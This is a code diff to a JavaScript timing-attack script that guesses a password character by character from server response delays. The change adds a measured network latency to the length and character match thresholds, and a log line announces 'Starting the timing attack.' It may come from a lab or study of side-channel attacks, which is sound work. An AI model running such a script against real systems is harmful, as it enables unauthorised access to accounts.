@@ -11,7 +11,7 @@ let exampleCharSetPointer = 0;
 let sizedMatchedTimes = 0;
 let charIndexMatchedTimes = 0;
 let establishConnectionRequestTimes = 0;
-let latency = 0;
+let latency = 100;
 
 const connectionEstablishmentResponseTimes = [];
 const sleepDiffThreshold = 200;
@@ -47,8 +47,8 @@ const generatePassword = () => {
         password += exampleCharSet[0];
     }
 };
-// const calculateSizeMatched = (diff) => diff > latency + sleepDiffThreshold;
-const calculateSizeMatched = (diff) => diff > sleepDiffThreshold;
+const calculateSizeMatched = (diff) => diff > latency + sleepDiffThreshold;
+// const calculateSizeMatched = (diff) => diff > sleepDiffThreshold;
 
 const reset = () => {
     password = exampleCharSet[0];
@@ -59,8 +59,8 @@ const reset = () => {
 };
 
 const calculateCharIndexMatched = (diff) => {
-    // let calcThreshold = latency + (charIndex + 2) * sleepDiffThreshold;
-    let calcThreshold = (charIndex + 2) * sleepDiffThreshold;
+    let calcThreshold = latency + (charIndex + 2) * sleepDiffThreshold;
+    // let calcThreshold = (charIndex + 2) * sleepDiffThreshold;
     if (diff < sleepDiffThreshold) {
         reset();
     }
@@ -90,6 +90,7 @@ async function establishStableConnection() {
         From (${establishConnectionRequestThreshold}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}.
         connectionEstablishmentResponseTimes: ${JSON.stringify(connectionEstablishmentResponseTimes)} ms.
         Starting the timing attack.`);
+    latency = connectionEstablishmentResponseTimes[0] / 2;
     await test();
 }
 
